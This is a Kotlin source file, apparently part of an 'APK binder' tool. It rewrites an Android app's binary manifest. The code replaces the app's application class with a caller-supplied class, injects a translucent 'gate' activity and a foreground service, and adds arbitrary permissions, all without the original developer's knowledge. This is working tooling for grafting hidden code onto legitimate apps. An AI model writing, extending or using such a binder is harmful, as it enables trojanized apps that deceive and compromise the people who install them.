package Com.devhs.apkbinder.binder

import java.io.ByteArrayOutputStream

object AxmlPatcher {

    private const val CHUNK_STRING_POOL = 0x0001
    private const val CHUNK_RESOURCE_MAP = 0x0180
    private const val CHUNK_START_ELEMENT = 0x0102
    private const val CHUNK_END_ELEMENT = 0x0103
    private const val FLAG_UTF8 = 0x100
    private const val TYPE_STRING = 0x03
    private const val TYPE_REFERENCE = 0x01
    private const val TYPE_INT_DEC = 0x10
    private const val ANDROID_NS = "http://schemas.android.com/apk/res/android"

    const val ATTR_NAME = 0x01010003
    const val ATTR_THEME = 0x01010000
    const val ATTR_FG_TYPE = 0x01010599
    const val STYLE_TRANSLUCENT = 0x0103000b

    sealed class Value {
        data class Str(val slot: Int) : Value()
        data class Ref(val v: Int) : Value()
        data class Dec(val v: Int) : Value()
    }

    class Attr(val nameSlot: Int, val value: Value)

    private class Pool(
        val start: Int,
        val size: Int,
        val headerSize: Int,
        val count: Int,
        val styleCount: Int,
        val flags: Int,
        val stringsStart: Int,
        val stylesStart: Int
    )

    private class Node {
        var raw: ByteArray? = null
        var attrBytes: ByteArrayOutputStream? = null
        var attrCount = 0
        var nameIdx = 0
        val children = ArrayList<Node>()
        var size = 0
    }

    private fun readPool(xml: ByteArray, start: Int): Pool = Pool(
        start = start,
        size = i32(xml, start + 4),
        headerSize = u16(xml, start + 2),
        count = i32(xml, start + 8),
        styleCount = i32(xml, start + 12),
        flags = i32(xml, start + 16),
        stringsStart = i32(xml, start + 20),
        stylesStart = i32(xml, start + 24)
    )

    private fun stringDataBase(pool: Pool): Int {
        val declared = pool.start + pool.stringsStart
        if (pool.stringsStart > 0 && declared < pool.start + pool.size) return declared
        return pool.start + pool.headerSize + pool.count * 4 + pool.styleCount * 4
    }

    private fun stringOffset(xml: ByteArray, pool: Pool, index: Int): Int =
        stringDataBase(pool) + i32(xml, pool.start + pool.headerSize + index * 4)

    private fun decodeAt(xml: ByteArray, off: Int, utf8: Boolean): String? = try {
        if (off < 0 || off >= xml.size) null
        else if (utf8) {
            val a = readVarint(xml, off)
            if (a == null) null else {
                val b = readVarint(xml, a.second)
                if (b == null || b.second + b.first > xml.size) null
                else String(xml, b.second, b.first, Charsets.UTF_8)
            }
        } else {
            if (off + 2 > xml.size) null else {
                val len = u16(xml, off)
                val p = off + 2
                if (p + len * 2 > xml.size) null
                else {
                    val sb = StringBuilder(len)
                    for (i in 0 until len) sb.append(u16(xml, p + i * 2).toChar())
                    sb.toString()
                }
            }
        }
    } catch (_: Throwable) {
        null
    }

    private fun matches(xml: ByteArray, pool: Pool, index: Int, target: String): Boolean {
        if (index < 0 || index >= pool.count) return false
        val off = stringOffset(xml, pool, index)
        val declared = (pool.flags and FLAG_UTF8) != 0
        if (decodeAt(xml, off, declared) == target) return true
        return decodeAt(xml, off, !declared) == target
    }

    private fun findApplication(xml: ByteArray): Int {
        val pool = readPool(xml, 8)
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (type == CHUNK_START_ELEMENT && matches(xml, pool, i32(xml, pos + 20), "application")) {
                return pos
            }
            pos += if (size >= 8 && pos + size <= xml.size) size else 4
        }
        return -1
    }

    private fun mapId(xml: ByteArray, stringIndex: Int): Int {
        val pool = readPool(xml, 8)
        val pos = pool.start + pool.size
        if (pos + 8 > xml.size || u16(xml, pos) != CHUNK_RESOURCE_MAP) return 0
        val entries = (i32(xml, pos + 4) - 8) / 4
        if (stringIndex < 0 || stringIndex >= entries) return 0
        return i32(xml, pos + 8 + stringIndex * 4)
    }

    private fun parse(xml: ByteArray): Node {
        val root = Node()
        val stack = ArrayList<Node>()
        stack.add(root)
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (size < 8 || pos + size > xml.size) break
            if (type == CHUNK_START_ELEMENT) {
                val node = Node()
                node.nameIdx = i32(xml, pos + 20)
                node.attrCount = u16(xml, pos + 28)
                val buf = ByteArrayOutputStream()
                buf.write(xml, pos + 36, node.attrCount * 20)
                node.attrBytes = buf
                stack[stack.size - 1].children.add(node)
                stack.add(node)
            } else if (type == CHUNK_END_ELEMENT) {
                if (stack.size > 1) stack.removeAt(stack.size - 1)
            } else {
                val node = Node()
                node.raw = xml.copyOfRange(pos, pos + size)
                stack[stack.size - 1].children.add(node)
            }
            pos += size
        }
        return root
    }

    private fun measure(n: Node) {
        val raw = n.raw
        if (raw != null) {
            n.size = raw.size
            return
        }
        var total = 36 + n.attrCount * 20 + 24
        for (c in n.children) {
            measure(c)
            total += c.size
        }
        n.size = total
    }

    private fun emit(n: Node, out: ByteArrayOutputStream) {
        val raw = n.raw
        if (raw != null) {
            out.write(raw)
            return
        }
        out.writeU16(CHUNK_START_ELEMENT)
        out.writeU16(16)
        out.writeI32(n.size)
        out.writeI32(1)
        out.writeI32(-1)
        out.writeI32(-1)
        out.writeI32(n.nameIdx)
        out.writeU16(20)
        out.writeU16(20)
        out.writeU16(n.attrCount)
        out.writeU16(0)
        out.writeU16(0)
        out.writeU16(0)
        out.write(n.attrBytes!!.toByteArray())
        for (c in n.children) emit(c, out)
        out.writeU16(CHUNK_END_ELEMENT)
        out.writeU16(16)
        out.writeI32(24)
        out.writeI32(1)
        out.writeI32(-1)
        out.writeI32(-1)
        out.writeI32(n.nameIdx)
    }

    private fun findByName(n: Node, xml: ByteArray, pool: Pool, name: String): Node? {
        if (n.raw == null && matches(xml, pool, n.nameIdx, name)) return n
        for (c in n.children) {
            val hit = findByName(c, xml, pool, name)
            if (hit != null) return hit
        }
        return null
    }

    private fun appendAttr(n: Node, bytes: ByteArray) {
        n.attrBytes!!.write(bytes)
        n.attrCount++
    }

    private fun makeElement(slot: Int, attrs: List<Attr>, nsSlot: Int): Node {
        val node = Node()
        node.nameIdx = slot
        val buf = ByteArrayOutputStream()
        attrs.forEach { a ->
            when (val v = a.value) {
                is Value.Str -> buf.writeAttr(nsSlot, a.nameSlot, v.slot, TYPE_STRING, v.slot)
                is Value.Ref -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_REFERENCE, v.v)
                is Value.Dec -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_INT_DEC, v.v)
            }
        }
        node.attrBytes = buf
        node.attrCount = attrs.size
        return node
    }

    private fun validate(xml: ByteArray, nameSlot: Int, themeSlot: Int, fgSlot: Int) {
        val pool = readPool(xml, 8)
        var pos = 8
        var elements = 0
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (size < 8 || pos + size > xml.size) throw IllegalStateException("broken chunk at " + pos)
            if (type == CHUNK_START_ELEMENT) {
                elements++
                val nameIdx = i32(xml, pos + 20)
                if (nameIdx < 0 || nameIdx >= pool.count) throw IllegalStateException("bad element name")
                val count = u16(xml, pos + 28)
                if (36 + count * 20 > size) throw IllegalStateException("attribute overflow")
                for (i in 0 until count) {
                    val ni = i32(xml, pos + 36 + i * 20 + 4)
                    if (ni < 0 || ni >= pool.count) throw IllegalStateException("bad attribute name")
                }
            }
            pos += size
        }
        if (elements == 0) throw IllegalStateException("no elements")
        if (mapId(xml, nameSlot) != ATTR_NAME) throw IllegalStateException("android:name id missing")
        if (mapId(xml, themeSlot) != ATTR_THEME) throw IllegalStateException("android:theme id missing")
        if (mapId(xml, fgSlot) != ATTR_FG_TYPE) throw IllegalStateException("foregroundServiceType id missing")
    }

    fun stats(xml: ByteArray): String {
        val pool = readPool(xml, 8)
        val utf8 = (pool.flags and FLAG_UTF8) != 0
        var app = 0
        var act = 0
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (type == CHUNK_START_ELEMENT) {
                val n = i32(xml, pos + 20)
                if (matches(xml, pool, n, "application")) app++
                if (matches(xml, pool, n, "activity")) act++
            }
            pos += if (size >= 8 && pos + size <= xml.size) size else 4
        }
        val sample = StringBuilder()
        for (i in 0 until minOf(pool.count, 6)) {
            sample.append(i).append('=')
            sample.append(decodeAt(xml, stringOffset(xml, pool, i), utf8) ?: "?")
            sample.append('|')
        }
        return "strings=" + pool.count + " app=" + app + " activity=" + act +
            " utf8=" + utf8 + " size=" + xml.size + "\nSAMPLE=" + sample
    }

    fun appAttrs(xml: ByteArray): String {
        val pos = findApplication(xml)
        if (pos < 0) return "(no application)"
        val pool = readPool(xml, 8)
        val utf8 = (pool.flags and FLAG_UTF8) != 0
        val count = u16(xml, pos + 28)
        val sb = StringBuilder("attrs=")
        sb.append(count)
        sb.append(" [")
        for (i in 0 until count) {
            val a = pos + 36 + i * 20
            val ni = i32(xml, a + 4)
            val type = xml[a + 15].toInt() and 0xFF
            val data = i32(xml, a + 16)
            sb.append(i).append(':')
            sb.append(decodeAt(xml, stringOffset(xml, pool, ni), utf8) ?: "?")
            sb.append("(t=").append(type).append(",d=").append(data)
            if (type == TYPE_STRING) {
                sb.append(",s=")
                sb.append(decodeAt(xml, stringOffset(xml, pool, data), utf8) ?: "?")
            }
            sb.append(") ")
        }
        sb.append(']')
        return sb.toString()
    }

    fun readApplicationName(xml: ByteArray): String? = try {
        val pos = findApplication(xml)
        if (pos < 0) null else {
            val pool = readPool(xml, 8)
            val count = u16(xml, pos + 28)
            var found: String? = null
            for (i in 0 until count) {
                val a = pos + 36 + i * 20
                if (!matches(xml, pool, i32(xml, a + 4), "name")) continue
                val raw = i32(xml, a + 8)
                val data = i32(xml, a + 16)
                val idx = if (raw >= 0) raw else data
                if (idx < 0 || idx >= pool.count) continue
                val off = stringOffset(xml, pool, idx)
                val declared = (pool.flags and FLAG_UTF8) != 0
                val s = decodeAt(xml, off, declared) ?: decodeAt(xml, off, !declared)
                if (!s.isNullOrBlank()) {
                    found = s
                    break
                }
            }
            found
        }
    } catch (_: Throwable) {
        null
    }

    fun patch(
        xml: ByteArray,
        newAppClass: String,
        activityClass: String,
        serviceClass: String,
        permissions: List<String>
    ): ByteArray {
        val added = ArrayList<String>()
        added.add("name")
        added.add("theme")
        added.add("foregroundServiceType")
        added.add(ANDROID_NS)
        added.add("activity")
        added.add("service")
        added.add("uses-permission")
        added.add(newAppClass)
        added.add(activityClass)
        added.add(serviceClass)
        permissions.forEach { added.add(it) }

        val oldCount = readPool(xml, 8).count
        val slot = { i: Int -> oldCount + i }

        val attrIds = LinkedHashMap<Int, Int>()
        attrIds[slot(0)] = ATTR_NAME
        attrIds[slot(1)] = ATTR_THEME
        attrIds[slot(2)] = ATTR_FG_TYPE

        val withStrings = appendStrings(xml, added, attrIds)
        val pool = readPool(withStrings, 8)
        val root = parse(withStrings)

        val manifest = findByName(root, withStrings, pool, "manifest")
            ?: throw IllegalStateException("manifest element not found")
        val application = findByName(root, withStrings, pool, "application")
            ?: throw IllegalStateException("application element not found")

        var replaced = false
        val attrs = application.attrBytes!!.toByteArray()
        for (i in 0 until application.attrCount) {
            val a = i * 20
            if (matches(withStrings, pool, i32(attrs, a + 4), "name")) {
                putI32(attrs, a + 8, slot(7))
                putU16(attrs, a + 12, 8)
                attrs[a + 14] = 0
                attrs[a + 15] = TYPE_STRING.toByte()
                putI32(attrs, a + 16, slot(7))
                replaced = true
                break
            }
        }
        application.attrBytes = ByteArrayOutputStream().apply { write(attrs) }
        if (!replaced) {
            val one = ByteArrayOutputStream()
            one.writeAttr(slot(3), slot(0), slot(7), TYPE_STRING, slot(7))
            appendAttr(application, one.toByteArray())
        }

        val gate = makeElement(
            slot(4),
            listOf(
                Attr(slot(0), Value.Str(slot(8))),
                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT))
            ),
            slot(3)
        )
        val service = makeElement(
            slot(5),
            listOf(
                Attr(slot(0), Value.Str(slot(9))),
                Attr(slot(2), Value.Dec(1))
            ),
            slot(3)
        )
        application.children.add(0, service)
        application.children.add(0, gate)

        val index = manifest.children.indexOf(application)
        for (i in 0 until permissions.size) {
            val perm = makeElement(slot(6), listOf(Attr(slot(0), Value.Str(slot(10) + i))), slot(3))
            manifest.children.add(index, perm)
        }

        measure(root)
        val out = ByteArrayOutputStream()
        out.write(withStrings, 0, 8)
        for (c in root.children) emit(c, out)
        val result = out.toByteArray()
        putI32(result, 4, result.size)

        validate(result, slot(0), slot(1), slot(2))
        return result
    }

    private fun appendStrings(xml: ByteArray, added: List<String>, attrIds: Map<Int, Int>): ByteArray {
        val pool = readPool(xml, 8)
        val utf8 = (pool.flags and FLAG_UTF8) != 0
        val dataStart = stringDataBase(pool)
        val dataEnd = if (pool.styleCount > 0 && pool.stylesStart > 0) pool.start + pool.stylesStart
        else pool.start + pool.size
        val safeEnd = if (dataEnd < dataStart) dataStart else minOf(dataEnd, xml.size)
        val oldData = xml.copyOfRange(dataStart, safeEnd)
        val styleData = if (pool.styleCount > 0 && pool.stylesStart > 0)
            xml.copyOfRange(pool.start + pool.stylesStart, pool.start + pool.size) else ByteArray(0)

        val data = ByteArrayOutputStream()
        data.write(oldData)
        val newOffsets = IntArray(added.size)
        for ((i, s) in added.withIndex()) {
            while (data.size() % 4 != 0) data.write(0)
            newOffsets[i] = data.size()
            if (utf8) {
                writeVarint(data, s.length)
                val bytes = s.toByteArray(Charsets.UTF_8)
                writeVarint(data, bytes.size)
                data.write(bytes)
                data.write(0)
            } else {
                data.write(s.length and 0xFF)
                data.write((s.length shr 8) and 0xFF)
                for (ch in s) {
                    data.write(ch.code and 0xFF)
                    data.write((ch.code shr 8) and 0xFF)
                }
                data.write(0)
                data.write(0)
            }
        }
        while (data.size() % 4 != 0) data.write(0)

        val newCount = pool.count + added.size
        val newData = data.toByteArray()
        val stringsStart = pool.headerSize + newCount * 4 + pool.styleCount * 4
        val stylesStart = if (pool.styleCount > 0) stringsStart + newData.size else 0
        val chunkSize = stringsStart + newData.size + styleData.size

        val out = ByteArrayOutputStream()
        out.write(xml, 0, pool.start)
        out.writeU16(CHUNK_STRING_POOL)
        out.writeU16(pool.headerSize)
        out.writeI32(chunkSize)
        out.writeI32(newCount)
        out.writeI32(pool.styleCount)
        out.writeI32(pool.flags)
        out.writeI32(stringsStart)
        out.writeI32(stylesStart)
        for (i in 0 until pool.count) out.writeI32(i32(xml, pool.start + pool.headerSize + i * 4))
        newOffsets.forEach { out.writeI32(it) }
        for (i in 0 until pool.styleCount) {
            out.writeI32(i32(xml, pool.start + pool.headerSize + pool.count * 4 + i * 4))
        }
        out.write(newData)
        out.write(styleData)
        out.write(xml, pool.start + pool.size, xml.size - pool.start - pool.size)

        val result = out.toByteArray()
        putI32(result, 4, result.size)
        return ensureResourceMap(result, newCount, attrIds)
    }

    private fun ensureResourceMap(xml: ByteArray, needed: Int, ids: Map<Int, Int>): ByteArray {
        val pool = readPool(xml, 8)
        val pos = pool.start + pool.size
        val hasMap = pos + 8 <= xml.size && u16(xml, pos) == CHUNK_RESOURCE_MAP

        if (!hasMap) {
            val block = ByteArray(8 + needed * 4)
            putU16(block, 0, CHUNK_RESOURCE_MAP)
            putU16(block, 2, 8)
            putI32(block, 4, 8 + needed * 4)
            ids.forEach { (i, id) -> if (i < needed) putI32(block, 8 + i * 4, id) }
            val out = ByteArrayOutputStream()
            out.write(xml, 0, pos)
            out.write(block)
            out.write(xml, pos, xml.size - pos)
            val result = out.toByteArray()
            putI32(result, 4, result.size)
            return result
        }

        val mapSize = i32(xml, pos + 4)
        val entries = (mapSize - 8) / 4
        val grow = (needed - entries).coerceAtLeast(0)

        val out = ByteArrayOutputStream()
        out.write(xml, 0, pos + mapSize)
        repeat(grow) { out.writeI32(0) }
        out.write(xml, pos + mapSize, xml.size - pos - mapSize)
        val result = out.toByteArray()

        putI32(result, pos + 4, mapSize + grow * 4)
        putI32(result, 4, result.size)
        ids.forEach { (i, id) -> if (i < entries + grow) putI32(result, pos + 8 + i * 4, id) }
        return result
    }

    private fun ByteArrayOutputStream.writeAttr(nsIdx: Int, nameIdx: Int, raw: Int, type: Int, data: Int) {
        writeI32(nsIdx)
        writeI32(nameIdx)
        writeI32(raw)
        writeU16(8)
        write(0)
        write(type)
        writeI32(data)
    }

    private fun readVarint(b: ByteArray, off: Int): Pair<Int, Int>? {
        if (off < 0 || off >= b.size) return null
        val first = b[off].toInt() and 0xFF
        return if (first and 0x80 != 0) {
            if (off + 1 >= b.size) null
            else (((first and 0x7F) shl 8) or (b[off + 1].toInt() and 0xFF)) to off + 2
        } else first to off + 1
    }

    private fun writeVarint(out: ByteArrayOutputStream, v: Int) {
        if (v > 0x7F) {
            out.write(((v shr 8) or 0x80) and 0xFF)
            out.write(v and 0xFF)
        } else out.write(v)
    }

    private fun u16(b: ByteArray, o: Int) = (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8)

    private fun i32(b: ByteArray, o: Int) =
        (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8) or
            ((b[o + 2].toInt() and 0xFF) shl 16) or ((b[o + 3].toInt() and 0xFF) shl 24)

    private fun putI32(b: ByteArray, o: Int, v: Int) {
        b[o] = v.toByte()
        b[o + 1] = (v shr 8).toByte()
        b[o + 2] = (v shr 16).toByte()
        b[o + 3] = (v shr 24).toByte()
    }

    private fun putU16(b: ByteArray, o: Int, v: Int) {
        b[o] = v.toByte()
        b[o + 1] = (v shr 8).toByte()
    }

    private fun ByteArrayOutputStream.writeU16(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
    }

    private fun ByteArrayOutputStream.writeI32(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
        write((v shr 16) and 0xFF)
        write((v shr 24) and 0xFF)
    }
}
